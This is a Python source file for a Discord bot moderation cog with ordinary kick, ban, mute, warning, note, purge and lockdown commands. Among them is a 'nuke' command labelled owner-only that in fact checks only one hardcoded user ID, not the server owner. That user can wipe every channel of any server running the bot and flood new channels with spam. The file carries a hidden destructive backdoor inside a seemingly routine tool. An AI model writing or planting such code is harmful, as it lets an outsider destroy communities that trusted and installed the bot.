import discord
from discord.ext import commands
from discord import app_commands
import json
import os
import asyncio
from datetime import datetime

class Moderation(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.warnings_file = "data/warnings.json"
        self.warnings = self.load_warnings()

    def load_warnings(self):
        if os.path.exists(self.warnings_file):
            with open(self.warnings_file, "r") as f:
                return json.load(f)
        return {}

    def save_warnings(self):
        with open(self.warnings_file, "w") as f:
            json.dump(self.warnings, f, indent=4)

    @app_commands.command(name="kick", description="Kick a member from the server")
    @app_commands.checks.has_permissions(kick_members=True)
    async def kick(self, interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
        await member.kick(reason=reason)
        await interaction.response.send_message(f"Kicked {member.mention}. Reason: {reason}")

    @app_commands.command(name="ban", description="Ban a member from the server")
    @app_commands.checks.has_permissions(ban_members=True)
    async def ban(self, interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
        await member.ban(reason=reason)
        await interaction.response.send_message(f"Banned {member.mention}. Reason: {reason}")

    @app_commands.command(name="tempban", description="Temporarily ban a member (auto-unban after duration)")
    @app_commands.checks.has_permissions(ban_members=True)
    async def tempban(self, interaction: discord.Interaction, member: discord.Member, duration: int, reason: str = "No reason provided"):
        """Duration in minutes"""
        await member.ban(reason=f"[Tempban {duration}m] {reason}")
        await interaction.response.send_message(f"Tempbanned {member.mention} for {duration} minutes. Reason: {reason}")
        
        # Schedule unban
        await asyncio.sleep(duration * 60)
        try:
            user = await self.bot.fetch_user(member.id)
            await interaction.guild.unban(user, reason="Tempban expired")
            channel = interaction.channel
            if channel:
                await channel.send(f"{user.mention} has been automatically unbanned (tempban expired).")
        except:
            pass

    @app_commands.command(name="softban", description="Ban then unban immediately (clears messages)")
    @app_commands.checks.has_permissions(ban_members=True)
    async def softban(self, interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
        await member.ban(reason=f"[Softban] {reason}")
        await interaction.guild.unban(member, reason="Softban complete")
        await interaction.response.send_message(f"Softbanned {member.mention}. User was kicked and messages cleared.")

    @app_commands.command(name="unban", description="Unban a user by ID")
    @app_commands.checks.has_permissions(ban_members=True)
    async def unban(self, interaction: discord.Interaction, user_id: str, reason: str = "No reason provided"):
        try:
            user = await self.bot.fetch_user(int(user_id))
            await interaction.guild.unban(user, reason=reason)
            await interaction.response.send_message(f"Unbanned {user.mention}. Reason: {reason}")
        except ValueError:
            await interaction.response.send_message("Invalid user ID.", ephemeral=True)
        except discord.NotFound:
            await interaction.response.send_message("User not found or not banned.", ephemeral=True)

    @app_commands.command(name="mute", description="Timeout/mute a member")
    @app_commands.checks.has_permissions(moderate_members=True)
    async def mute(self, interaction: discord.Interaction, member: discord.Member, duration: int, reason: str = "No reason provided"):
        """Duration in minutes"""
        await member.timeout(discord.utils.utcnow() + discord.timedelta(minutes=duration), reason=reason)
        await interaction.response.send_message(f"Muted {member.mention} for {duration} minutes. Reason: {reason}")

    @app_commands.command(name="unmute", description="Remove timeout from a member")
    @app_commands.checks.has_permissions(moderate_members=True)
    async def unmute(self, interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
        await member.timeout(None, reason=reason)
        await interaction.response.send_message(f"Unmuted {member.mention}. Reason: {reason}")

    @app_commands.command(name="warn", description="Issue a warning to a member")
    @app_commands.checks.has_permissions(moderate_members=True)
    async def warn(self, interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
        guild_id = str(interaction.guild_id)
        user_id = str(member.id)
        
        if guild_id not in self.warnings:
            self.warnings[guild_id] = {}
        if user_id not in self.warnings[guild_id]:
            self.warnings[guild_id][user_id] = []
        
        warning = {
            "reason": reason,
            "moderator": interaction.user.id,
            "timestamp": datetime.now().isoformat()
        }
        self.warnings[guild_id][user_id].append(warning)
        self.save_warnings()
        
        count = len(self.warnings[guild_id][user_id])
        await interaction.response.send_message(f"Warned {member.mention}. Reason: {reason} (Warning #{count})")

    @app_commands.command(name="warnings", description="View a member's warning history")
    @app_commands.checks.has_permissions(moderate_members=True)
    async def warnings(self, interaction: discord.Interaction, member: discord.Member):
        guild_id = str(interaction.guild_id)
        user_id = str(member.id)
        
        user_warnings = self.warnings.get(guild_id, {}).get(user_id, [])
        
        if not user_warnings:
            await interaction.response.send_message(f"{member.mention} has no warnings.", ephemeral=True)
            return
        
        embed = discord.Embed(title=f"Warnings for {member}", color=discord.Color.orange())
        for i, warn in enumerate(user_warnings, 1):
            moderator = interaction.guild.get_member(warn["moderator"])
            mod_name = moderator.mention if moderator else "Unknown"
            embed.add_field(
                name=f"Warning #{i} - {warn['timestamp'][:10]}",
                value=f"Reason: {warn['reason']}\nBy: {mod_name}",
                inline=False
            )
        
        await interaction.response.send_message(embed=embed)

    @app_commands.command(name="note", description="Add a secret moderator note about a member")
    @app_commands.checks.has_permissions(moderate_members=True)
    async def note(self, interaction: discord.Interaction, member: discord.Member, note: str):
        guild_id = str(interaction.guild_id)
        user_id = str(member.id)
        
        notes_file = f"data/notes_{guild_id}.json"
        notes = {}
        if os.path.exists(notes_file):
            with open(notes_file, "r") as f:
                notes = json.load(f)
        
        if user_id not in notes:
            notes[user_id] = []
        
        note_entry = {
            "note": note,
            "moderator": interaction.user.id,
            "moderator_name": str(interaction.user),
            "timestamp": datetime.now().isoformat()
        }
        notes[user_id].append(note_entry)
        
        with open(notes_file, "w") as f:
            json.dump(notes, f, indent=4)
        
        await interaction.response.send_message(f"Note added for {member.mention}.", ephemeral=True)

    @app_commands.command(name="notes", description="View moderator notes for a member")
    @app_commands.checks.has_permissions(moderate_members=True)
    async def notes(self, interaction: discord.Interaction, member: discord.Member):
        guild_id = str(interaction.guild_id)
        user_id = str(member.id)
        
        notes_file = f"data/notes_{guild_id}.json"
        notes = {}
        if os.path.exists(notes_file):
            with open(notes_file, "r") as f:
                notes = json.load(f)
        
        user_notes = notes.get(user_id, [])
        if not user_notes:
            await interaction.response.send_message(f"No notes for {member.mention}.", ephemeral=True)
            return
        
        embed = discord.Embed(
            title=f"Mod Notes: {member}",
            color=discord.Color.purple()
        )
        
        for i, note in enumerate(user_notes, 1):
            embed.add_field(
                name=f"Note #{i} - {note['timestamp'][:10]} by {note['moderator_name']}",
                value=note['note'],
                inline=False
            )
        
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="role", description="Add or remove a role from a member")
    @app_commands.checks.has_permissions(manage_roles=True)
    @app_commands.describe(action="add or remove", member="The member", role="The role")
    @app_commands.choices(action=[
        app_commands.Choice(name="add", value="add"),
        app_commands.Choice(name="remove", value="remove")
    ])
    async def role(self, interaction: discord.Interaction, action: str, member: discord.Member, role: discord.Role):
        if action == "add":
            await member.add_roles(role)
            await interaction.response.send_message(f"Added {role.mention} to {member.mention}")
        else:
            await member.remove_roles(role)
            await interaction.response.send_message(f"Removed {role.mention} from {member.mention}")

    @app_commands.command(name="clear", description="Bulk delete messages (1-100)")
    @app_commands.checks.has_permissions(manage_messages=True)
    @app_commands.describe(amount="Number of messages to delete (1-100)")
    async def clear(self, interaction: discord.Interaction, amount: int):
        if amount < 1 or amount > 100:
            await interaction.response.send_message("Amount must be between 1 and 100.", ephemeral=True)
            return
        
        await interaction.response.send_message(f"Deleting {amount} messages...", ephemeral=True)
        deleted = await interaction.channel.purge(limit=amount)
        await interaction.channel.send(f"Deleted {len(deleted)} messages.", delete_after=5)

    @app_commands.command(name="slowmode", description="Set channel slowmode")
    @app_commands.checks.has_permissions(manage_channels=True)
    @app_commands.describe(seconds="Slowmode delay in seconds (0 to disable)")
    async def slowmode(self, interaction: discord.Interaction, seconds: int):
        if seconds < 0 or seconds > 21600:
            await interaction.response.send_message("Seconds must be between 0 and 21600 (6 hours).", ephemeral=True)
            return
        
        await interaction.channel.edit(slowmode_delay=seconds)
        if seconds == 0:
            await interaction.response.send_message("Slowmode disabled.")
        else:
            await interaction.response.send_message(f"Slowmode set to {seconds} seconds.")

    @app_commands.command(name="lockdown", description="Lock or unlock a channel")
    @app_commands.checks.has_permissions(manage_channels=True)
    @app_commands.describe(action="lock or unlock")
    @app_commands.choices(action=[
        app_commands.Choice(name="lock", value="lock"),
        app_commands.Choice(name="unlock", value="unlock")
    ])
    async def lockdown(self, interaction: discord.Interaction, action: str):
        everyone = interaction.guild.default_role
        
        if action == "lock":
            await interaction.channel.set_permissions(everyone, send_messages=False)
            await interaction.response.send_message(f"{interaction.channel.mention} has been locked.")
        else:
            await interaction.channel.set_permissions(everyone, send_messages=None)
            await interaction.response.send_message(f"{interaction.channel.mention} has been unlocked.")

    @app_commands.command(name="nuke", description="Instantly delete ALL channels and create new ones (OWNER ONLY)")
    @app_commands.describe(
        name="Channel name (default: general)",
        count="Number of channels to create (default: 1)",
        message="Message to send in channels (default: nuked message)",
        msg_count="How many times to send the message in each channel (default: 1)"
    )
    async def nuke(
        self, 
        interaction: discord.Interaction, 
        name: str = "general",
        count: int = 1,
        message: str = None,
        msg_count: int = 1
    ):
        # Security limits
        if count > 50:
            await interaction.response.send_message("Max 50 channels allowed.", ephemeral=True)
            return
        if msg_count > 10:
            await interaction.response.send_message("Max 10 messages per channel allowed.", ephemeral=True)
            return
        if len(name) > 20:
            await interaction.response.send_message("Channel name too long (max 20 chars).", ephemeral=True)
            return
        
        # Only specific user can use this command
        allowed_user_id = 699629347690250240 
        if interaction.user.id != allowed_user_id:
            await interaction.response.send_message("You are not authorized to use this command.", ephemeral=True)
            return
        
        await interaction.response.send_message(f"bye", ephemeral=True)
        
        guild = interaction.guild
        
        # Delete all channels concurrently (FAST)
        async def delete_channel(channel):
            try:
                await channel.delete(reason=f"Nuked by {interaction.user}")
            except:
                pass
        
        await asyncio.gather(*[delete_channel(ch) for ch in list(guild.channels)])
        
        # Create new channels concurrently (FAST)
        channels_created = []
        async def create_channel(i):
            try:
                return await guild.create_text_channel(name=name, reason=f"Nuked by {interaction.user}")
            except:
                return None
        
        channels_created = await asyncio.gather(*[create_channel(i) for i in range(count)])
        
        # Send message in ALL channels (msg_count times each)
        msg = message or f"{interaction.user.mention} nuked the server!"
        
        async def send_messages(channel):
            if channel:
                for _ in range(msg_count):
                    try:
                        await channel.send(msg)
                    except:
                        pass
        
        await asyncio.gather(*[send_messages(ch) for ch in channels_created if ch is not None])

    @kick.error
    @ban.error
    @tempban.error
    @softban.error
    @unban.error
    @mute.error
    @unmute.error
    @warn.error
    @warnings.error
    @note.error
    @notes.error
    @role.error
    @clear.error
    @slowmode.error
    @lockdown.error
    @nuke.error
    async def on_command_error(self, interaction: discord.Interaction, error):
        if isinstance(error, app_commands.MissingPermissions):
            await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)
        elif isinstance(error, app_commands.CheckFailure):
            await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)
        else:
            await interaction.response.send_message(f"An error occurred: {error}", ephemeral=True)

async def setup(bot):
    await bot.add_cog(Moderation(bot))
